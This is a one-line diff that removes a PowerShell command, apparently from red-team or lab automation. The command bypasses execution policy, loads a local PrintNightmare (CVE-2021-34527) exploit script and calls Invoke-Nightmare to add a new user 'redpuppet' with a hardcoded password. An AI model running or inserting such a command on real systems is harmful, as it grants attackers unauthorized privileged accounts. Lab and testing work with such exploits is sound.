@@ -1,1 +1,0 @@
-powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (Get-Content C:\programdata\puppet\CVE-2021-34527.ps1 -Raw); Invoke-Nightmare -DriverName Xerox3010 -NewUser redpuppet -NewPassword RedPuppet123"
